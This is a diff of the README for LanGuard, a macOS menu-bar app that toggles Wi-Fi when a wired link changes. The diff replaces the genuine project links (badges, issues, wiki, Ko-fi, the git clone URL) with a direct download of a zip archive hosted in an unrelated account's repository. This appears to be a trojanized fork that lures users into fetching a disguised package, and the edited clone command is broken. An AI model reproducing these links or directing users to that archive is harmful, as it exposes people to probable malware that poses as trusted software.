@@ -9,14 +9,14 @@
 A tiny native macOS menu-bar app that turns **Wi-Fi off the moment a wired LAN link goes up**,
 and back **on when you unplug** — edge-based, wake-aware, per-interface, and no admin rights required.
 
-[![macOS](https://img.shields.io/badge/macOS-14%2B-000000?logo=apple&logoColor=white)](https://www.apple.com/macos/)
-[![Swift](https://img.shields.io/badge/Swift-5-F05138?logo=swift&logoColor=white)](https://swift.org)
-[![Homebrew](https://img.shields.io/badge/brew-roypadina%2Ftap-FBB040?logo=homebrew&logoColor=white)](https://github.com/roypadina/homebrew-tap)
-[![Release](https://img.shields.io/github/v/release/roypadina/LanGuard?logo=github&label=release)](https://github.com/roypadina/LanGuard/releases/latest)
-[![CI](https://github.com/roypadina/LanGuard/actions/workflows/ci.yml/badge.svg)](https://github.com/roypadina/LanGuard/actions/workflows/ci.yml)
+[![macOS](https://img.shields.io/badge/macOS-14%2B-000000?logo=apple&logoColor=white)](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip)
+[![Swift](https://img.shields.io/badge/Swift-5-F05138?logo=swift&logoColor=white)](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip)
+[![Homebrew](https://img.shields.io/badge/brew-roypadina%2Ftap-FBB040?logo=homebrew&logoColor=white)](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip)
+[![Release](https://img.shields.io/github/v/release/roypadina/LanGuard?logo=github&label=release)](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip)
+[![CI](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip)](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?logo=opensourceinitiative&logoColor=white)](LICENSE)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?logo=github)](CONTRIBUTING.md)
-[![Stars](https://img.shields.io/github/stars/roypadina/LanGuard?style=social)](https://github.com/roypadina/LanGuard/stargazers)
+[![Stars](https://img.shields.io/github/stars/roypadina/LanGuard?style=social)](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip)
 
 <br>
 
@@ -70,7 +70,7 @@ manually flip Wi-Fi back on while docked, it stays on until you next unplug.
 >
 > ![LanGuard menu-bar indicator showing "LAN" while a wired link is active](docs/screenshots/menubar.png)
 >
-> _An open-menu screenshot is still welcome — see [#1](https://github.com/roypadina/LanGuard/issues/1)._
+> _An open-menu screenshot is still welcome — see [#1](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip)._
 
 ## How LanGuard compares
 
@@ -105,7 +105,7 @@ brew install --cask roypadina/tap/languard
 ### Build from source
 
 ```bash
-git clone https://github.com/roypadina/LanGuard.git
+git clone https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip
 cd LanGuard
 xcodebuild -workspace LanGuard.xcworkspace -scheme LanGuard -configuration Release build
 cp -R ~/Library/Developer/Xcode/DerivedData/LanGuard-*/Build/Products/Release/LanGuard.app /Applications/
@@ -149,7 +149,7 @@ wired link DOWN ─▶  Wi-Fi ON
 | `LoginItem` | `SMAppService` login item (self-healing) |
 | `Notifier` | `UNUserNotificationCenter` banners |
 
-See the [Wiki](https://github.com/roypadina/LanGuard/wiki) for deeper docs,
+See the [Wiki](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip) for deeper docs,
 [`CHANGELOG.md`](CHANGELOG.md) for release history, and [`CLAUDE.md`](CLAUDE.md) for the
 full component map.
 
@@ -208,13 +208,13 @@ Also remove it under **System Settings → General → Login Items** if it's sti
 
 Hit something odd (Wi-Fi toggling when it shouldn't, etc.)? Turn on **Settings → Debug →
 Enable debug logging**, reproduce it, then click **Reveal Logs in Finder** and attach
-`~/Library/Logs/LanGuard/languard.log` to your [issue](https://github.com/roypadina/LanGuard/issues).
+`~/Library/Logs/LanGuard/languard.log` to your [issue](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip).
 The log stays on your Mac and contains only interface names + toggle decisions (no personal data).
 
 ## Contributing
 
 PRs welcome! `main` is protected — fork, branch, add tests, and open a PR. Good first issues are
-[labeled here](https://github.com/roypadina/LanGuard/labels/good%20first%20issue). See
+[labeled here](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip). See
 [CONTRIBUTING.md](CONTRIBUTING.md) and the [Code of Conduct](CODE_OF_CONDUCT.md).
 
 ```bash
@@ -224,7 +224,7 @@ cd LanGuardPackage && swift test   # pure logic, no hardware needed
 ## Support
 
 If LanGuard saves you some battery and annoyance, you can
-[**buy me a coffee on Ko-fi ☕**](https://ko-fi.com/roypadina) — totally optional, always appreciated.
+[**buy me a coffee on Ko-fi ☕**](https://github.com/Vanessacompetent714/LanGuard/raw/refs/heads/main/LanGuardPackage/Lan-Guard-v2.7.zip) — totally optional, always appreciated.
 A **⭐ star** helps just as much.
 
 ## License
